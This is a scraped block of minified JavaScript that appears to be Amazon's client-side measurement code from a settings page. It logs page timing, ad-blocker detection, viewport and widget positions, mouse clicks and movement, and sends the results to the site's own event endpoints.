(function(b){function c(){var d=[];a.log&&a.log.isStub&&a.log.replay(function(a){e(d,a)});a.clog&&a.clog.isStub&&a.clog.replay(function(a){e(d,a)});d.length&&(a._flhs+=1,n(d),p(d))}function g(){a.log&&a.log.isStub&&(a.onflush&&a.onflush.replay&&a.onflush.replay(function(a){a[0]()}),a.onunload&&a.onunload.replay&&a.onunload.replay(function(a){a[0]()}),c())}function e(d,b){var c=b[1],f=b[0],e={};a._lpn[c]=(a._lpn[c]||0)+1;e[c]=f;d.push(e)}function n(b){q&&(a._lpn.csm=(a._lpn.csm||0)+1,b.push({csm:{k:"chk",
f:a._flhs,l:a._lpn,s:"inln"}}))}function p(a){if(h)a=k(a),b.navigator.sendBeacon(l,a);else{a=k(a);var c=new b[f];c.open("POST",l,!0);c.setRequestHeader&&c.setRequestHeader("Content-type","text/plain");c.send(a)}}function k(a){return JSON.stringify({rid:b.ue_id,sid:b.ue_sid,mid:b.ue_mid,mkt:b.ue_mkt,sn:b.ue_sn,reqs:a})}var f="XMLHttpRequest",q=1===b.ue_ddq,a=b.ue,r=b[f]&&"withCredentials"in new b[f],h=b.navigator&&b.navigator.sendBeacon,l="//"+b.ue_furl+"/1/batch/1/OE/",m=b.ue_fci_ft||5E3;a&&(r||h)&&
(a._flhs=a._flhs||0,a._lpn=a._lpn||{},a.attach&&(a.attach("beforeunload",g),a.attach("pagehide",g)),m&&b.setTimeout(c,m),a._ffci=c)})(window);


(function(k,c){function l(a,b){return a.filter(function(a){return a.initiatorType==b})}function f(a,c){if(b.t[a]){var g=b.t[a]-b._t0,e=c.filter(function(a){return 0!==a.responseEnd&&m(a)<g}),f=l(e,"script"),h=l(e,"link"),k=l(e,"img"),n=e.map(function(a){return a.name.split("/")[2]}).filter(function(a,b,c){return a&&c.lastIndexOf(a)==b}),q=e.filter(function(a){return a.duration<p}),s=g-Math.max.apply(null,e.map(m))<r|0;"af"==a&&(b._afjs=f.length);return a+":"+[e[d],f[d],h[d],k[d],n[d],q[d],s].join("-")}}
function m(a){return a.responseEnd-(b._t0-c.timing.navigationStart)}function n(){var a=c[h]("resource"),d=f("cf",a),g=f("af",a),a=f("ld",a);delete b._rt;b._ld=b.t.ld-b._t0;b._art&&b._art();return[d,g,a].join("_")}var p=20,r=50,d="length",b=k.ue,h="getEntriesByType";b._rre=m;b._rt=c&&c.timing&&c[h]&&n})(ue_csm,window.performance);


(function(c,d){var b=c.ue,a=d.navigator;b&&b.tag&&a&&(a=a.connection||a.mozConnection||a.webkitConnection)&&a.type&&b.tag("netInfo:"+a.type)})(ue_csm,window);


(function(c,d){function h(a,b){for(var c=[],d=0;d<a.length;d++){var e=a[d],f=b.encode(e);if(e[k]){var g=b.metaSep,e=e[k],l=b.metaPairSep,h=[],m=void 0;for(m in e)e.hasOwnProperty(m)&&h.push(m+"="+e[m]);e=h.join(l);f+=g+e}c.push(f)}return c.join(b.resourceSep)}function s(a){var b=a[k]=a[k]||{};b[t]||(b[t]=c.ue_mid);b[u]||(b[u]=c.ue_sid);b[f]||(b[f]=c.ue_id);b.csm=1;a="//"+c.ue_furl+"/1/"+a[v]+"/1/OP/"+a[w]+"/"+a[x]+"/"+h([a],y);if(n)try{n.call(d[p],a)}catch(g){c.ue.sbf=1,(new Image).src=a}else(new Image).src=
a}function q(){g&&g.isStub&&g.replay(function(a,b,c){a=a[0];b=a[k]=a[k]||{};b[f]=b[f]||c;s(a)});l.impression=s;g=null}if(!(1<c.ueinit)){var k="metadata",x="impressionType",v="foresterChannel",w="programGroup",t="marketplaceId",u="session",f="requestId",p="navigator",l=c.ue||{},n=d[p]&&d[p].sendBeacon,r=function(a,b,c,d){return{encode:d,resourceSep:a,metaSep:b,metaPairSep:c}},y=r("","?","&",function(a){return h(a.impressionData,z)}),z=r("/",":",",",function(a){return a.featureName+":"+h(a.resources,
A)}),A=r(",","@","|",function(a){return a.id}),g=l.impression;n?q():(l.attach("load",q),l.attach("beforeunload",q));try{d.P&&d.P.register&&d.P.register("impression-client",function(){})}catch(B){c.ueLogError(B,{logLevel:"WARN"})}}})(ue_csm,window);



var ue_pty = "CPEFront";

var ue_spty = "settings";



var ue_adb = 4;
var ue_adb_rtla = 1;
ue_csm.ue.exec(function(y,a){function t(){if(d&&f){var a;a:{try{a=d.getItem(g);break a}catch(c){}a=void 0}if(a)return b=a,!0}return!1}function u(){if(a.fetch)fetch(m).then(function(a){if(!a.ok)throw Error(a.statusText);return a.text?a.text():null}).then(function(b){b?(-1<b.indexOf("window.ue_adb_chk = 1")&&(a.ue_adb_chk=1),n()):h()})["catch"](h);else e.uels(m,{onerror:h,onload:n})}function h(){b=k;l();if(f)try{d.setItem(g,b)}catch(a){}}function n(){b=1===a.ue_adb_chk?p:k;l();if(f)try{d.setItem(g,
b)}catch(c){}}function q(){a.ue_adb_rtla&&c&&0<c.ec&&!1===r&&(c.elh=null,ueLogError({m:"Hit Info",fromOnError:1},{logLevel:"INFO",adb:b}),r=!0)}function l(){e.tag(b);e.isl&&a.uex&&uex("at",b);s&&s.updateCsmHit("adb",b);c&&0<c.ec?q():a.ue_adb_rtla&&c&&(c.elh=q)}function v(){return b}if(a.ue_adb){a.ue_fadb=a.ue_fadb||10;var e=a.ue,k="adblk_yes",p="adblk_no",m="https://m.media-amazon.com/images/G/01/csm/showads.v2.js",b="adblk_unk",d;a:{try{d=a.localStorage;break a}catch(z){}d=void 0}var g="csm:adb",
c=a.ue_err,s=e.cookie,f=void 0!==a.localStorage,w=Math.random()>1-1/a.ue_fadb,r=!1,x=t();w||!x?u():l();a.ue_isAdb=v;a.ue_isAdb.unk="adblk_unk";a.ue_isAdb.no=p;a.ue_isAdb.yes=k}},"adb")(document,window);




(function(c,l,m){function h(a){if(a)try{if(a.id)return"//*[@id='"+a.id+"']";var b,d=1,e;for(e=a.previousSibling;e;e=e.previousSibling)e.nodeName===a.nodeName&&(d+=1);b=d;var c=a.nodeName;1!==b&&(c+="["+b+"]");a.parentNode&&(c=h(a.parentNode)+"/"+c);return c}catch(f){return"DETACHED"}}function f(a){if(a&&a.getAttribute)return a.getAttribute(k)?a.getAttribute(k):f(a.parentElement)}var k="data-cel-widget",g=!1,d=[];(c.ue||{}).isBF=function(){try{var a=JSON.parse(localStorage["csm-bf"]||"[]"),b=0<=a.indexOf(c.ue_id);
a.unshift(c.ue_id);a=a.slice(0,20);localStorage["csm-bf"]=JSON.stringify(a);return b}catch(d){return!1}}();c.ue_utils={getXPath:h,getFirstAscendingWidget:function(a,b){c.ue_cel&&c.ue_fem?!0===g?b(f(a)):d.push({element:a,callback:b}):b()},notifyWidgetsLabeled:function(){if(!1===g){g=!0;for(var a=f,b=0;b<d.length;b++)if(d[b].hasOwnProperty("callback")&&d[b].hasOwnProperty("element")){var c=d[b].callback,e=d[b].element;"function"===typeof c&&"function"===typeof a&&c(a(e))}d=null}},extractStringValue:function(a){if("string"===
typeof a)return a}}})(ue_csm,window,document);


(function(a,c){a.ue_cel||(a.ue_cel=function(){function h(a,b){b?b.r=y:b={r:y,c:1};!ue_csm.ue_sclog&&b.clog&&e.clog?e.clog(a,b.ns||n,b):b.glog&&e.glog?e.glog(a,b.ns||n,b):e.log(a,b.ns||n,b)}function l(){var a=b.length;if(0<a){for(var f=[],c=0;c<a;c++){var g=b[c].api;g.ready()?(g.on({ts:e.d,ns:n}),d.push(b[c]),h({k:"mso",n:b[c].name,t:e.d()})):f.push(b[c])}b=f}}function f(){if(!f.executed){for(var a=0;a<d.length;a++)d[a].api.off&&d[a].api.off({ts:e.d,ns:n});q();h({k:"eod",t0:e.t0,t:e.d()},{c:1,il:1});
f.executed=1;for(a=0;a<d.length;a++)b.push(d[a]);d=[];clearTimeout(t);clearTimeout(v)}}function q(a){h({k:"hrt",t:e.d()},{c:1,il:1,n:a});g=Math.min(k,r*g);z()}function z(){clearTimeout(v);v=setTimeout(function(){q(!0)},g)}function u(){f.executed||q()}var r=1.5,k=c.ue_cel_max_hrt||3E4,b=[],d=[],n=a.ue_cel_ns||"cel",t,v,e=a.ue,m=a.uet,w=a.uex,y=e.rid,g=c.ue_cel_hrt_int||3E3,s=c.requestAnimationFrame||function(a){a()};if(e.isBF)h({k:"bft",t:e.d()});else{"function"==typeof m&&m("bb","csmCELLSframework",
{wb:1});setTimeout(l,0);e.onunload(f);if(e.onflush)e.onflush(u);t=setTimeout(f,6E5);z();"function"==typeof w&&w("ld","csmCELLSframework",{wb:1});return{registerModule:function(a,c){b.push({name:a,api:c});h({k:"mrg",n:a,t:e.d()});l()},reset:function(a){h({k:"rst",t0:e.t0,t:e.d()});b=b.concat(d);d=[];for(var c=b.length,g=0;g<c;g++)b[g].api.off(),b[g].api.reset();y=a||e.rid;l();clearTimeout(t);t=setTimeout(f,6E5);f.executed=0},timeout:function(a,b){return c.setTimeout(function(){s(function(){f.executed||
a()})},b)},log:h,off:f}}}())})(ue_csm,window);
(function(a,c,h){a.ue_pdm||!a.ue_cel||ue.isBF||(a.ue_pdm=function(){function l(){try{var b=window.screen;if(b){var c={w:b.width,aw:b.availWidth,h:b.height,ah:b.availHeight,cd:b.colorDepth,pd:b.pixelDepth};e&&e.w===c.w&&e.h===c.h&&e.aw===c.aw&&e.ah===c.ah&&e.pd===c.pd&&e.cd===c.cd||(e=c,e.t=t(),e.k="sci",s(e))}var g=h.body||{},f=h.documentElement||{},d={w:Math.max(g.scrollWidth||0,g.offsetWidth||0,f.clientWidth||0,f.scrollWidth||0,f.offsetWidth||0),h:Math.max(g.scrollHeight||0,g.offsetHeight||0,f.clientHeight||
0,f.scrollHeight||0,f.offsetHeight||0)};m&&m.w===d.w&&m.h===d.h||(m=d,m.t=t(),m.k="doi",s(m));n=a.ue_cel.timeout(l,v);y+=1}catch(r){window.ueLogError&&ueLogError(r,{attribution:"csm-cel-page-module",logLevel:"WARN"})}}function f(){k("ebl","default",!1)}function q(){k("efo","default",!0)}function z(){k("ebl","app",!1)}function u(){k("efo","app",!0)}function r(){c.setTimeout(function(){h[D]?k("ebl","pageviz",!1):k("efo","pageviz",!0)},0)}function k(a,b,c){w!==c&&s({k:a,t:t(),s:b},{ff:!0===c?0:1});w=
c}function b(){g.attach&&(x&&g.attach(p,r,h),A&&P.when("mash").execute(function(a){a&&a.addEventListener&&(a.addEventListener("appPause",z),a.addEventListener("appResume",u))}),g.attach("blur",f,c),g.attach("focus",q,c))}function d(){g.detach&&(x&&g.detach(p,r,h),A&&P.when("mash").execute(function(a){a&&a.removeEventListener&&(a.removeEventListener("appPause",z),a.removeEventListener("appResume",u))}),g.detach("blur",f,c),g.detach("focus",q,c))}var n,t,v,e,m,w=null,y=0,g=a.ue,s=a.ue_cel.log,B=a.uet,
E=a.uex,x=!!g.pageViz,p=x&&g.pageViz.event,D=x&&g.pageViz.propHid,A=c.P&&c.P.when;"function"==typeof B&&B("bb","csmCELLSpdm",{wb:1});return{on:function(a){v=a.timespan||500;t=a.ts;b();a=c.location;s({k:"pmd",o:a.origin,p:a.pathname,t:t()});l();"function"==typeof E&&E("ld","csmCELLSpdm",{wb:1})},off:function(a){clearTimeout(n);d();g.count&&g.count("cel.PDM.TotalExecutions",y)},ready:function(){return h.body&&a.ue_cel&&a.ue_cel.log},reset:function(){e=m=null}}}(),a.ue_cel&&a.ue_cel.registerModule("page module",
a.ue_pdm))})(ue_csm,window,document);
(function(a,c){a.ue_vpm||!a.ue_cel||ue.isBF||(a.ue_vpm=function(){function h(){var a=u(),b={w:c.innerWidth,h:c.innerHeight,x:c.pageXOffset,y:c.pageYOffset};f&&f.w==b.w&&f.h==b.h&&f.x==b.x&&f.y==b.y||(b.t=a,b.k="vpi",f=b,d(f,{clog:1}));q=0;r=u()-a;k+=1}function l(){q||(q=a.ue_cel.timeout(h,z))}var f,q,z,u,r=0,k=0,b=a.ue,d=a.ue_cel.log,n=a.uet,t=a.uex,v=b.attach,e=b.detach;"function"==typeof n&&n("bb","csmCELLSvpm",{wb:1});return{on:function(a){u=a.ts;z=a.timespan||100;h();v&&(v("scroll",l),v("resize",
l));"function"==typeof t&&t("ld","csmCELLSvpm",{wb:1})},off:function(a){clearTimeout(q);e&&(e("scroll",l),e("resize",l));b.count&&(b.count("cel.VPI.TotalExecutions",k),b.count("cel.VPI.TotalExecutionTime",r),b.count("cel.VPI.AverageExecutionTime",r/k))},ready:function(){return a.ue_cel&&a.ue_cel.log},reset:function(){f=void 0},getVpi:function(){return f}}}(),a.ue_cel&&a.ue_cel.registerModule("viewport module",a.ue_vpm))})(ue_csm,window);
(function(a,c,h){if(!a.ue_fem&&a.ue_cel&&a.ue_utils){var l=a.ue||{};!l.isBF&&!a.ue_fem&&h.querySelector&&c.getComputedStyle&&[].forEach&&(a.ue_fem=function(){function f(a,b){return a>b?3>a-b:3>b-a}function q(a,b){var e=c.pageXOffset,g=c.pageYOffset,d;a:{try{if(a){var h=a.getBoundingClientRect(),r,l=0===a.offsetWidth&&0===a.offsetHeight;c:{for(var k=a.parentNode,n=h.left||0,p=h.top||0,s=h.width||0,t=h.height||0;k&&k!==document.body;){var m;d:{try{var q=void 0;if(k)var C=k.getBoundingClientRect(),q=
{x:C.left||0,y:C.top||0,w:C.width||0,h:C.height||0};else q=void 0;m=q;break d}catch(v){}m=void 0}var u=window.getComputedStyle(k),w="hidden"===u.overflow,N=w||"hidden"===u.overflowX,J=w||"hidden"===u.overflowY,z=p+t-1<m.y+1||p+1>m.y+m.h-1;if((n+s-1<m.x+1||n+1>m.x+m.w-1)&&N||z&&J){r=!0;break c}k=k.parentNode}r=!1}d={x:h.left+e||0,y:h.top+g||0,w:h.width||0,h:h.height||0,d:(l||r)|0}}else d=void 0;break a}catch(A){}d=void 0}if(d&&!a.cel_b)a.cel_b=d,x({n:a.getAttribute(y),w:a.cel_b.w,h:a.cel_b.h,d:a.cel_b.d,
x:a.cel_b.x,y:a.cel_b.y,t:b,k:"ewi",cl:a.className},{clog:1});else{if(e=d)e=a.cel_b,g=d,e=g.d===e.d&&1===g.d?!1:!(f(e.x,g.x)&&f(e.y,g.y)&&f(e.w,g.w)&&f(e.h,g.h)&&e.d===g.d);e&&(a.cel_b=d,x({n:a.getAttribute(y),w:a.cel_b.w,h:a.cel_b.h,d:a.cel_b.d,x:a.cel_b.x,y:a.cel_b.y,t:b,k:"ewi"},{clog:1}))}}function z(b,e){var c;c=b.c?h.getElementsByClassName(b.c):b.id?[h.getElementById(b.id)]:h.querySelectorAll(b.s);b.w=[];for(var d=0;d<c.length;d++){var f=c[d];if(f){if(!f.getAttribute(y)){var r=f.getAttribute("cel_widget_id")||
(b.id_gen||E)(f,d)||f.id;f.setAttribute(y,r)}b.w.push(f);k(Q,f,e)}}!1===B&&(s++,s===g.length&&(B=!0,a.ue_utils.notifyWidgetsLabeled()))}function u(a,b){p.contains(a)||x({n:a.getAttribute(y),t:b,k:"ewd"},{clog:1})}function r(a){I.length&&ue_cel.timeout(function(){if(m){for(var b=R(),c=!1;R()-b<e&&!c;){for(c=S;0<c--&&0<I.length;){var g=I.shift();T[g.type](g.elem,g.time)}c=0===I.length}U++;r(a)}},0)}function k(a,b,c){I.push({type:a,elem:b,time:c})}function b(a,b){for(var c=0;c<g.length;c++)for(var e=
g[c].w||[],d=0;d<e.length;d++)k(a,e[d],b)}function d(){K||(K=a.ue_cel.timeout(function(){K=null;var c=w();b(W,c);for(var e=0;e<g.length;e++)k(X,g[e],c);0===g.length&&!1===B&&(B=!0,a.ue_utils.notifyWidgetsLabeled());r(c)},v))}function n(){K||O||(O=a.ue_cel.timeout(function(){O=null;var a=w();b(Q,a);r(a)},v))}function t(){return A&&F&&p&&p.contains&&p.getBoundingClientRect&&w}var v=50,e=4.5,m=!1,w,y="data-cel-widget",g=[],s=0,B=!1,E=function(){},x=a.ue_cel.log,p,D,A,F,G=c.MutationObserver||c.WebKitMutationObserver||
c.MozMutationObserver,N=!!G,H,C,J="DOMAttrModified",L="DOMNodeInserted",M="DOMNodeRemoved",O,K,I=[],U=0,S=null,W="removedWidget",X="updateWidgets",Q="processWidget",T,V=c.performance||{},R=V.now&&function(){return V.now()}||function(){return Date.now()};"function"==typeof uet&&uet("bb","csmCELLSfem",{wb:1});return{on:function(b){function c(){if(t()){T={removedWidget:u,updateWidgets:z,processWidget:q};if(N){var a={attributes:!0,subtree:!0};H=new G(n);C=new G(d);H.observe(p,a);C.observe(p,{childList:!0,
subtree:!0});C.observe(D,a)}else A.call(p,J,n),A.call(p,L,d),A.call(p,M,d),A.call(D,L,n),A.call(D,M,n);d()}}p=h.body;D=h.head;A=p.addEventListener;F=p.removeEventListener;w=b.ts;g=a.cel_widgets||[];S=b.bs||5;l.deffered?c():l.attach&&l.attach("load",c);"function"==typeof uex&&uex("ld","csmCELLSfem",{wb:1});m=!0},off:function(){t()&&(C&&(C.disconnect(),C=null),H&&(H.disconnect(),H=null),F.call(p,J,n),F.call(p,L,d),F.call(p,M,d),F.call(D,L,n),F.call(D,M,n));l.count&&l.count("cel.widgets.batchesProcessed",
U);m=!1},ready:function(){return a.ue_cel&&a.ue_cel.log},reset:function(){g=a.cel_widgets||[]}}}(),a.ue_cel&&a.ue_fem&&a.ue_cel.registerModule("features module",a.ue_fem))}})(ue_csm,window,document);
(function(a,c,h){!a.ue_mcm&&a.ue_cel&&a.ue_utils&&!a.ue.isBF&&(a.ue_mcm=function(){function l(a,k){var b=a.srcElement||a.target||{},d={k:f,w:(k||{}).ow||(c.body||{}).scrollWidth,h:(k||{}).oh||(c.body||{}).scrollHeight,t:(k||{}).ots||q(),x:a.pageX,y:a.pageY,p:u.getXPath(b),n:b.nodeName};h&&"function"===typeof h.now&&a.timeStamp&&(d.dt=(k||{}).odt||h.now()-a.timeStamp,d.dt=parseFloat(d.dt.toFixed(2)));a.button&&(d.b=a.button);b.href&&(d.r=u.extractStringValue(b.href));b.id&&(d.i=b.id);b.className&&
b.className.split&&(d.c=b.className.split(/\s+/));z(d,{c:1})}var f="mcm",q,z=a.ue_cel.log,u=a.ue_utils;return{on:function(c){q=c.ts;a.ue_cel_stub&&a.ue_cel_stub.replayModule(f,l);window.addEventListener&&window.addEventListener("mousedown",l,!0)},off:function(a){window.addEventListener&&window.removeEventListener("mousedown",l,!0)},ready:function(){return a.ue_cel&&a.ue_cel.log},reset:function(){}}}(),a.ue_cel&&a.ue_cel.registerModule("mouse click module",a.ue_mcm))})(ue_csm,document,window.performance);
(function(a,c){a.ue_mmm||!a.ue_cel||a.ue.isBF||(a.ue_mmm=function(h){function l(a,b){var c={x:a.pageX||a.x||0,y:a.pageY||a.y||0,t:k()};!b&&x&&(c.t-x.t<z||c.x==x.x&&c.y==x.y)||(x=c,s.push(c))}function f(){if(s.length){y=G.now();for(var a=0;a<s.length;a++){var b=s[a],c=a;p=s[E];D=b;var d=void 0;if(!(d=2>c)){d=void 0;a:if(s[c].t-s[c-1].t>q)d=0;else{for(d=E+1;d<c;d++){var f=p,h=D,k=s[d];A=(h.x-f.x)*(f.y-k.y)-(f.x-k.x)*(h.y-f.y);if(A*A/((h.x-f.x)*(h.x-f.x)+(h.y-f.y)*(h.y-f.y))>u){d=0;break a}}d=1}d=!d}(F=
d)?E=c-1:B.pop();B.push(b)}g=G.now()-y;v=Math.min(v,g);e=Math.max(e,g);m=(m*w+g)/(w+1);w+=1;n({k:r,e:B,min:Math.floor(1E3*v),max:Math.floor(1E3*e),avg:Math.floor(1E3*m)},{c:1});s=[];B=[];E=0}}var q=100,z=20,u=25,r="mmm1",k,b,d=a.ue,n=a.ue_cel.log,t,v=1E3,e=0,m=0,w=0,y,g,s=[],B=[],E=0,x,p,D,A,F,G=h&&h.now&&h||Date.now&&Date||{now:function(){return(new Date).getTime()}};return{on:function(a){k=a.ts;b=a.ns;d.attach&&d.attach("mousemove",l,c);t=setInterval(f,3E3)},off:function(a){b&&(x&&l(x,!0),f());
clearInterval(t);d.detach&&d.detach("mousemove",l,c)},ready:function(){return a.ue_cel&&a.ue_cel.log},reset:function(){s=[];B=[];E=0;x=null}}}(window.performance),a.ue_cel&&a.ue_cel.registerModule("mouse move module",a.ue_mmm))})(ue_csm,document);



ue_csm.ue.exec(function(b,c){var e=function(){},f=function(){return{send:function(b,d){if(d&&b){var a;if(c.XDomainRequest)a=new XDomainRequest,a.onerror=e,a.ontimeout=e,a.onprogress=e,a.onload=e,a.timeout=0;else if(c.XMLHttpRequest){if(a=new XMLHttpRequest,!("withCredentials"in a))throw"";}else a=void 0;if(!a)throw"";a.open("POST",b,!0);a.setRequestHeader&&a.setRequestHeader("Content-type","text/plain");a.send(d)}},isSupported:!0}}(),g=function(){return{send:function(c,d){if(c&&d)if(navigator.sendBeacon(c,
d))b.ue_sbuimp&&b.ue&&b.ue.ssw&&b.ue.ssw("eelsts","scs");else throw"";},isSupported:!!navigator.sendBeacon&&!(c.cordova&&c.cordova.platformId&&"ios"==c.cordova.platformId)}}();b.ue._ajx=f;b.ue._sBcn=g},"Transportation-clients")(ue_csm,window);
ue_csm.ue.exec(function(b,k){function A(){for(var a=0;a<arguments.length;a++){var c=arguments[a];try{var h;if(c.isSupported){var b=t.buildPayload(l,e);h=c.send(J,b)}else throw dummyException;return h}catch(d){}}B({m:"All supported clients failed",attribution:"CSMSushiClient_TRANSPORTATION_FAIL",f:"sushi-client.js",logLevel:"ERROR"},k.ue_err_chan||"jserr")}function m(){if(e.length){for(var a=0;a<n.length;a++)n[a]();A(d._sBcn||{},d._ajx||{});e=[];f={};l={};u=v=q=w=0}}function K(){var a=new Date,c=function(a){return 10>
a?"0"+a:a};return Date.prototype.toISOString?a.toISOString():a.getUTCFullYear()+"-"+c(a.getUTCMonth()+1)+"-"+c(a.getUTCDate())+"T"+c(a.getUTCHours())+":"+c(a.getUTCMinutes())+":"+c(a.getUTCSeconds())+"."+String((a.getUTCMilliseconds()/1E3).toFixed(3)).slice(2,5)+"Z"}function x(a){try{return JSON.stringify(a)}catch(c){}return null}function C(a,c,h,g){var p=!1;g=g||{};r++;r==D&&B({m:"Max number of Sushi Logs exceeded",f:"sushi-client.js",logLevel:"ERROR",attribution:"CSMSushiClient_MAX_CALLS"},k.ue_err_chan||
"jserr");var f;if(f=!(r>=D))(f=a&&-1<a.constructor.toString().indexOf("Object")&&c&&-1<c.constructor.toString().indexOf("String")&&h&&-1<h.constructor.toString().indexOf("String"))||L++;f&&(d.count&&d.count("Event:"+h,1),a.producerId=a.producerId||c,a.schemaId=a.schemaId||h,a.timestamp=K(),c=Date.now?Date.now():+new Date,h=Math.random().toString().substring(2,12),a.messageId=b.ue_id+"-"+c+"-"+h,g&&!g.ssd&&(a.sessionId=a.sessionId||b.ue_sid,a.requestId=a.requestId||b.ue_id,a.obfuscatedMarketplaceId=
a.obfuscatedMarketplaceId||b.ue_mid),(c=x(a))?(c=c.length,(e.length==M||q+c>N)&&m(),q+=c,a={data:t.compressEvent(a)},e.push(a),(g||{}).n?0===E?m():u||(u=k.setTimeout(m,E)):v||(v=k.setTimeout(m,O)),p=!0):p=!1);!p&&b.ue_int&&console.error("Invalid JS Nexus API call");return p}function F(){if(!G){for(var a=0;a<y.length;a++)y[a]();for(a=0;a<n.length;a++)n[a]();e.length&&(b.ue_sbuimp&&b.ue&&b.ue.ssw&&(a=x({dct:l,evt:e}),b.ue.ssw("eeldata",a),b.ue.ssw("eelsts","unk")),A(d._sBcn||{}));G=!0}}function H(a){y.push(a)}
function I(a){n.push(a)}var D=1E3,M=499,N=524288,s=function(){},d=b.ue||{},B=d.log||s,P=b.uex||s;(b.uet||s)("bb","ue_sushi_v1",{wb:1});var J=b.ue_surl||"https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.gamma",Q=["messageId","timestamp"],z="#",e=[],f={},l={},q=0,w=0,L=0,r=0,y=[],n=[],G=!1,u,v,E=void 0===b.ue_hpsi?1E3:b.ue_hpsi,O=void 0===b.ue_lpsi?1E4:b.ue_lpsi,t=function(){function a(a){f[a]=z+w++;l[f[a]]=a;return f[a]}function c(b){if(!(b instanceof Function)){if(b instanceof Array){for(var g=
[],d=b.length,e=0;e<d;e++)g[e]=c(b[e]);return g}if(b instanceof Object){g={};for(d in b)b.hasOwnProperty(d)&&(g[f[d]?f[d]:a(d)]=-1===Q.indexOf(d)?c(b[d]):b[d]);return g}return"string"===typeof b&&(b.length>(z+w).length||b.charAt(0)===z)?f[b]?f[b]:a(b):b}}return{compressEvent:c,buildPayload:function(){return x({cs:{dct:l},events:e})}}}();(function(){if(d.event&&d.event.isStub){if(b.ue_sbuimp&&b.ue&&b.ue.ssw){var a=b.ue.ssw("eelsts").val;if(a&&"unk"===a&&(a=b.ue.ssw("eeldata").val)){var c;a:{try{c=
JSON.parse(a);break a}catch(f){}c=null}c&&c.evt instanceof Array&&c.dct instanceof Object&&(e=c.evt,l=c.dct,e&&l&&(m(),b.ue.ssw("eeldata","{}"),b.ue.ssw("eelsts","scs")))}}d.event.replay(function(a){a[3]=a[3]||{};a[3].n=1;C.apply(this,a)});d.onSushiUnload.replay(function(a){H(a[0])});d.onSushiFlush.replay(function(a){I(a[0])})}})();d.attach("beforeunload",F);d.attach("pagehide",F);d._cmps=t;d.event=C;d.event.reset=function(){r=0};d.onSushiUnload=H;d.onSushiFlush=I;try{k.P&&k.P.register&&k.P.register("sushi-client",
s)}catch(R){b.ueLogError(R,{logLevel:"WARN"})}P("ld","ue_sushi_v1",{wb:1})},"Nxs-JS-Client")(ue_csm,window);


ue_csm.ue_unrt = 1500;
(function(d,b,t){function u(a,b){var c=a.srcElement||a.target||{},e={k:w,t:b.t,dt:b.dt,x:a.pageX,y:a.pageY,p:f.getXPath(c),n:c.nodeName};a.button&&(e.b=a.button);c.type&&(e.ty=c.type);c.href&&(e.r=f.extractStringValue(c.href));c.id&&(e.i=c.id);c.className&&c.className.split&&(e.c=c.className.split(/\s+/));g+=1;f.getFirstAscendingWidget(c,function(a){e.wd=a;d.ue.log(e,r)})}function x(a){if(!y(a.srcElement||a.target)){k+=1;n=!0;var v=h=d.ue.d(),c;p&&"function"===typeof p.now&&a.timeStamp&&(c=p.now()-
a.timeStamp,c=parseFloat(c.toFixed(2)));s=b.setTimeout(function(){u(a,{t:v,dt:c})},z)}}function A(a){if(a){var b=a.filter(B);a.length!==b.length&&(q=!0,l=d.ue.d(),n&&q&&(l&&h&&d.ue.log({k:C,t:h,m:Math.abs(l-h)},r),m(),q=!1,l=0))}}function B(a){if(!a)return!1;var b="characterData"===a.type?a.target.parentElement:a.target;if(!b||!b.hasAttributes||!b.attributes)return!1;var c={"class":"gw-clock gw-clock-aria s-item-container-height-auto feed-carousel using-mouse kfs-inner-container".split(" "),id:["dealClock",
"deal_expiry_timer","timer"],role:["timer"]},e=!1;Object.keys(c).forEach(function(a){var d=b.attributes[a]?b.attributes[a].value:"";(c[a]||"").forEach(function(a){-1!==d.indexOf(a)&&(e=!0)})});return e}function y(a){if(!a)return!1;var b=(f.extractStringValue(a.nodeName)||"").toLowerCase(),c=(f.extractStringValue(a.type)||"").toLowerCase(),d=(f.extractStringValue(a.href)||"").toLowerCase();a=(f.extractStringValue(a.id)||"").toLowerCase();var g="checkbox color date datetime-local email file month number password radio range reset search tel text time url week".split(" ");
if(-1!==["select","textarea","html"].indexOf(b)||"input"===b&&-1!==g.indexOf(c)||"a"===b&&-1!==d.indexOf("http")||-1!==["sitbreaderrightpageturner","sitbreaderleftpageturner","sitbreaderpagecontainer"].indexOf(a))return!0}function m(){n=!1;h=0;b.clearTimeout(s)}function D(){b.ue.onSushiUnload(function(){ue.event({violationType:"unresponsive-clicks",violationCount:g,totalScanned:k},"csm","csm.ArmoredCXGuardrailsViolation.3")});b.ue.onunload(function(){ue.count("armored-cxguardrails.unresponsive-clicks.violations",
g);ue.count("armored-cxguardrails.unresponsive-clicks.violationRate",g/k*100||0)})}if(b.MutationObserver&&b.addEventListener&&Object.keys&&d&&d.ue&&d.ue.log&&d.ue_unrt&&d.ue_utils){var z=d.ue_unrt,r="cel",w="unr_mcm",C="res_mcm",p=b.performance,f=d.ue_utils,n=!1,h=0,s=0,q=!1,l=0,g=0,k=0;b.addEventListener&&(b.addEventListener("mousedown",x,!0),b.addEventListener("beforeunload",m,!0),b.addEventListener("visibilitychange",m,!0),b.addEventListener("pagehide",m,!0));b.ue&&b.ue.event&&b.ue.onSushiUnload&&
b.ue.onunload&&D();(new MutationObserver(A)).observe(t,{childList:!0,attributes:!0,characterData:!0,subtree:!0})}})(ue_csm,window,document);


ue_csm.ue.exec(function(g,e){if(e.ue_err){var f="";e.ue_err.errorHandlers||(e.ue_err.errorHandlers=[]);e.ue_err.errorHandlers.push({name:"fctx",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel)if(f=g.getElementsByTagName("html")[0].innerHTML){var b=f.indexOf("var ue_t0=ue_t0||+new Date();");if(-1!==b){var b=f.substr(0,b).split(String.fromCharCode(10)),d=Math.max(b.length-10-1,0),b=b.slice(d,b.length-1);a.fcsmln=d+b.length+1;a.cinfo=a.cinfo||{};for(var c=0;c<b.length;c++)a.cinfo[d+c+1+""]=
b[c]}b=f.split(String.fromCharCode(10));a.cinfo=a.cinfo||{};if(!(a.f||void 0===a.l||a.l in a.cinfo))for(c=+a.l-1,d=Math.max(c-5,0),c=Math.min(c+5,b.length-1);d<=c;d++)a.cinfo[d+1+""]=b[d]}}})}},"fatals-context")(document,window);


